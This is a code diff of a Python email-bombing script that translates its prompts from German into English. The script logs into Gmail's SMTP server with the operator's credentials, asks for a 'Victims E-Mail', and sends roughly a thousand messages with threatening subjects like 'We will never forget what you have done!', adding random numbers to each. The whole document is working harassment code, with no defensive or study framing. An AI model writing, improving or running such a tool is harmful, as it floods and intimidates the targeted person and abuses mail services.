@@ -12,8 +12,8 @@ def boot():
     print("======================================================================")
 
 boot()
-username = input(str("E-Mail Adresse    : "))
-password = input(str("E-Mail Passwort   : "))
+username = input(str("Your E-Mail Address    : "))
+password = input(str("Your E-Mail Password   : "))
 
 def server_start():
     server = smtplib.SMTP("smtp.gmail.com")
@@ -23,13 +23,13 @@ def server_start():
     return server
 
 def spamm(server):
-    emails = input(str("E-Mail zum Angreifen: "))
+    emails = input(str("Victims E-Mail: "))
     for mailanz in range(1, 1000):
-        print(f"=={mailanz}== wurden gesendet!")
+        print(f"=={mailanz}== mail(s) have been sent!")
         msg = MIMEText(
         "We will never forget!" + str(randint(1,9999))
         )
-        msg["Subject"] = "Das Internet vergisst nie! " + str(randint(1, 9999))
+        msg["Subject"] = "We will never forget what you have done! " + str(randint(1, 9999))
         msg["From"] = username
         msg["To"] = emails
         server.sendmail(username, emails, msg.as_string())
